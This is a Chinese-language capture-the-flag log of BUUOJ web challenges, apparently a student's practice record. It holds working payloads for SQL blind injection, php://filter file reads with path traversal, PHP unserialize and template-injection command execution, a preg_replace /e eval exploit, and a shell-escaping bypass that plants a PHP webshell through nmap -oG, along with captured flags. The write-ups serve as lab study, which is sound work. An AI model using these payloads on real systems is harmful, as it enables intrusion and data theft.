当前进度：

8/104-2/13

buuoj

## [CISCN2019 华北赛区 Day2 Web1]Hack World

一眼sql，先试试过滤，

一开始还以为是union之类的关键字被过滤掉了，后来才发现只是%20空格被过滤掉了，同样被过滤掉还有分号，用来防止堆叠注入

可喜可贺的是除了or和and的关键字几乎都没有被过滤，而且刚好给了id=1和id=2两个页面来给我们作判断标志，那么可以采用盲注的方法！

至于空格，有很多绕过的方法：

%09 %0a %0b %0c %0d /**/ /*!*/或者直接tab
%20 好像没法绕，%00截断好像也影响sql语句的执行

当然我们用括号也是可以的，

payload的构造模仿下面：

```
if(ascii(substr((select(flag)from(flag)),1,1)),1,2)
```

剩下的就是去盲注枚举就可以了！一大好处其实是已经告诉了我们table和column，所以直接盲注，脚本附在日期目录下了`bool_blind.py`

## [BSidesCF 2020]Had a bad day

观察发现，基本操作是用GET请求了一个参数category来决定是显示woofer的图片还是meower的图片，看来注入点就在这里。

（哎呀不得不说猫猫狗狗确实可爱，忍不住多看了一会儿，发现图片是随机，但是图库不大，会重复

将category修改为1,2之类的，发现都报错说仅支持woofer和meower，于是尝试woofera，发现这次报错是说fnf，看来规则是我们的category中一定要有woofer或者meower才能进入到include()的那一步

既然是include()包含，那么最常用的data://协议和php://协议可以搬出来耍耍了

经过试验，data://协议被禁用，而php://可以使用。

使用经典方法来获取源码：

?category=php://filter/read=convert.base64-encode/resource=filename

目前已知的应该就是woofer和meower，一开始不成功，明白过来应该是在后面拼接了.php所以不能加扩展名，那么分别得到源码：

**woofer:**

PGNlbnRlcj4KCTxoND4gV29vZiEgV29vZiEgPC9oND4KPC9jZW50ZXI+CjxpbWcgc3R5bGU9IndpZHRoOjEwMCUiIHNyYz0iaW1nL2RvZy88P3BocCBlY2hvIHJhbmQoMSwxMCk/Pi5qcGciPg== 

```html
<center>
        <h4> Woof! Woof! </h4>
</center>
<img style="width:100%" src="img/dog/<?php echo rand(1,10)?>.jpg">%
```

**meower:**

PGNlbnRlcj4KCTxoND4gTWVvdyEgTWVvdyEgPC9oND4KPC9jZW50ZXI+CjxpbWcgc3R5bGU9IndpZHRoOjEwMCUiIHNyYz0iaW1nL2NhdC88P3BocCBlY2hvIHJhbmQoMSwxMCk/Pi5qcGciPg== 

```html
<center>
        <h4> Meow! Meow! </h4>
</center>
<img style="width:100%" src="img/cat/<?php echo rand(1,10)?>.jpg">%
```

不知道还有些啥，抱着试一试的心态爆一下index.php，既然还真可以：

**index:**

PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk/PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk/PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk/IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw/cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg== 

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
                                $file = $_GET['category'];

                                if(isset($file))
                                {
                                        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
                                                include ($file . '.php');
                                        }
                                        else{
                                                echo "Sorry, we currently only support woofers and meowers.";
                                        }
                                }
                                ?>
                        </div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>

          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>
```

还是没有什么太大的收获......至少知道了对woofer/meower/index的检查如我们所想

其实直觉来说，flag很可能就在网站的根目录下，但是怎么include出来是个大问题，没有办法绕过woofer

这个时候就要利用到php的一个特性：

**在解析目录地址时，php会对地址进行一步预先的计算，来处理地址中间的../这样回到父级目录的行为，然后只对最终地址进行处理**

也就是说我传入

```
?category=php://filter/read=convert.base64-encode/resource=woofers/../flag
```

那么尽管woofers/目录根本不存在（只是用来绕过检查），但最后计算出来的地址和他没有关系，就说`/flag`，所以还是能爆出flag（如果存在的话），当然如果最后计算出来的地址不存在还是会出错

于是成功爆出flag！（真的很幸运就在根目录下面）

PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ODZkMzM3YjQtNTg4MS00ODdlLTkxN2MtYzFkMGFkOTRhMjMzfQo/Pgo= 

<!-- Can you read this flag? -->
<?php
 // flag{86d337b4-5881-487e-917c-c1d0ad94a233}
?>

## [网鼎杯 2018]Fakebook

这题的实例有点问题，不知道为什么注册了用户点击username部分就直接504...先放着吧

（偷懒标记成完成一题好了，不然不整齐了

## [网鼎杯 2020 朱雀组]phpweb

突脸鬼图打码（笑

网页非常诡异，一直定时自动刷新，刷新完之后还有一条报错信息：有关date()函数

```
Warning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
```

看起来是一直在自动执行这个函数并刷新页面，居然是函数执行的话，我们就找到了可能的入侵口

用burpsuite抓包检视，发现实际上是执行了一个POST操作：

func=&p=

看来就是执行的函数func和参数p,

先试一试phpinfo，发现回显Hacker，被禁用了......

还有可能有其他被禁用的，总之我们可以用highlight_file查看源码：

func=highlight_file&p=index.php

能用！得到response包将TEXT部分拷贝到.html文件再用浏览器打开得到源码：

```
<!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
</p>
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>
```

可以看到过滤了相当多的函数啊，

但是这个TEST类的定义也太明显是有关反序列化了！因为在TEST类的__destruct方法里不需要过滤，所以可以执行任意命令！

我们先构造`system("ls /")`，发现根目录下没有flag，那就直接全盘找！

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"find / -iname '*flag*'";s:4:"func";s:6:"system";}
```

得到响应：

```
HTTP/1.1 200 OK
Server: openresty
Date: Thu, 30 Oct 2025 13:06:25 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.5.38
Vary: Accept-Encoding
Cache-Control: no-cache
Content-Length: 2673

<!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    /proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/tmp/flagoefiu4r93
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/lib/x86_64-linux-gnu/perl/5.20.2/bits/waitflags.ph
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/include/linux/tty_flags.h</p>
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>
```

`/tmp/flagoefiu4r93`显得格格不入，就是你了，直接cat出来：

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

得到flag!

## [BJDCTF2020]The mystery of ip

不得不说一上来这个bg图片很有品味啊（啧啧啧）

点击flag链接，载入flag.php渲染的页面，提示出了我们的ip，

说到ip，果然就是`X-Forwarded-For`吧，抓包并伪造ip，发现不仅可以伪造ip，并且在X-Forwarded-For处填写任意字符串都会直接回显到页面上。

这种感觉，是模板注入没差了。

用`{{2*2}}`试验是否能够进行模板注入，回显4，大成功。

那么接下来就可以在这里面执行任意指令，直接找flag:

```
{{system("find / -iname '*flag*')}}
```

(注意结尾无需分号)

回显：

```
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Thu, 30 Oct 2025 13:54:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.13
Content-Length: 4208

<!DOCTYPE html>
<html>
	<head>
		<title>
			The_mystery_of_ip
		</title>
		<meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1.0">
		<!-- Bootstrap -->
		<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
		<link href="css/shana_flag.css" rel="stylesheet" media="screen">
		<script src="jquery/jquery-3.3.1.min.js"></script>
		<script src="bootstrap/js/bootstrap.min.js"></script>

		<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media
        queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file://
        -->
        <!--[if lt IE 9]>
            <script src="http://labfile.oss.aliyuncs.com/html5shiv/3.7.0/html5shiv.js">
            </script>
            <script src="http://labfile.oss.aliyuncs.com/respond.js/1.3.0/respond.min.js">
            </script>
        <![endif]-->
    </head>

    <body>

    	<nav class="navbar navbar-default navbar-static-top nav1">
			<div class="container-fluid">
				<div class="navbar-header ul-head0">
				    <button class="navbar-toggle collapsed" data-target=".navbar-collapse" data-toggle="collapse" type="button">
				    	<span class="icon-bar"></span>
				    	<span class="icon-bar"></span>
				    	<span class="icon-bar"></span>
				    </button>
				    <a href="index.php" class="navbar-brand">BJDCTF</a>
				</div>

				<div class="navbar-collapse collapse nav2" aria-expanded="false" style="height: 0px">
				    <ul class="nav navbar-nav ul-head1">
				    	<li class=""><a href="flag.php">Flag</a></li>
				    	<li class=""><a href="hint.php">Hint</a></li>
				    </ul>

				    <ul class="nav navbar-nav navbar-right ul-head2">
                    	<li class=""><a href="index.php">@Shana</a></li>
               		</ul>
				</div>
			</div>	
		</nav><div class="container panel1">
					<div class="row">
					<div class="col-md-4">	
					</div>
					<div class="col-md-4">
					<div class="jumbotron pan">
						<div class="form-group log">
							<label><h2>Your IP is : /proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/var/www/html/css/shana_flag.css
/var/www/html/flag.php
/usr/local/lib/php/build/ax_check_compile_flag.m4
/flag
/flag				</h2></label>
						</div>		
					</div>
					</div>
					<div class="col-md-4">	
					</div>
					</div>
				</div>
	</body>
</html>
```

根目录下就有`/flag`，直接cat，得到flag

## [BJDCTF2020]ZJCTF，不过如此

参考文章：https://www.xinyueseo.com/websecurity/158.html

这标题好大的口气（倒吸一口凉气）

点进去发现对标的应该是ZJCTF2019的那道Nizhuansiwei，很像

用一样的方法提取`next.php`的源码：

PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
        @eval($_GET['cmd']);
}
```

这里的complex函数中的preg_replace是php<5.5的一个经典漏洞，具体可以看前面给了链接的那篇文章，这里简单记录一下我的理解

`preg_replace($a, $b, $c)`在$a中带有/e模式时，会将$a对于$c中匹配出的片段，用于执行$b中的php代码，并且如上面的代码所示，一般与\1这样的匹配项标识符结合。之所以写成\\1室方便php转义，实际上就是\1，用在这个位置结合/e模式用于指代第一个匹配项，类似的，如果有/2就代表第二匹配项。

我们构造这样的payload来执行getFlag()函数并获取flag:

```
?\S*=${getFlag()}&cmd=system("cat /flag")
```

首先，`\S*`和`.*`在正则匹配中是一样的意思，即匹配任意字符串，用在这里相当于直接把$c整个给取出来；

其次，foreach中的`$re => $str`指的是将GET到的每个参数以`参数id => 参数内容`的键值对方式传递，也就是我们这里的id参数完全没有用，鉴于在preg_match中我们用到了$re，所以像上面那样构造我们传入的第一个参数的名字。为什么不用.*，是因为.在GET参数命名中是非法参数，会被替换成下划线_。

然后，我们用${}来包裹getFlag()是因为当以这样的变量作为函数参数时，php便会先去执行括号内的函数，这样可以起到执行我们的想要的函数的名字的作用。

最后就是传入cmd来进行RCE，这里偷了懒嘿嘿。

总之是得到Flag了！

## [BUUCTF 2018]Online Tool

分析源码：

```
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

两个大爹在此：escapeshellarg()和escapeshellcmd()

- escapeshellarg(): 将参数作为一个完整的 shell 参数进行安全转义。在参数两端加单引号，并对参数中的单引号进行'\'转义，防止命令注入。
- escapeshellcmd(): 对整条命令字符串进行安全转义。会转义（在前面加反斜杠）特殊的 shell 元字符：&, ;, |, $, >, <, \, ", ', *, ?, ~, #, (), {}, [], !（对于引号和括号等，只转义不配对的）

但是根据大佬留下来的指引，当两个一起用的时候会产生漏洞！

**例子**：

传入的参数是：172.17.0.2' -v -d a=1

经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义

最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。

因此我们只需要构造?host=127.0.0.1'在前面就可以在后面进行操作了

因为没办法堆叠指令，所以要用到nmap的一个参数-oG

-oG可以实现将命令和结果写到文件，所以我们可以控制自己的输入写入文件，

构造payload:

?host=' <?php echo `cat /flag`;?> -oG test.php '

（在末尾加一个'来闭合最后多出来的那个'也是完全ok的

php中**反引号**包裹的内容会被解析成shell命令进行执行并返回相应的输出，这里是将这段一句话Php输出的内容写入到test.php中（当然nmap的原始相应也会一并写入），而插入的这段脚本由于先前的对WAF的绕过也是会被执行的，这样就能得到flag了！

## [GXYCTF2019]禁止套娃

https://www.cnblogs.com/LLeaves/p/12868440.html

wp有点长，明天再做吧zzz

## ENd

当前进度：
15/104-3/13

加油啊...







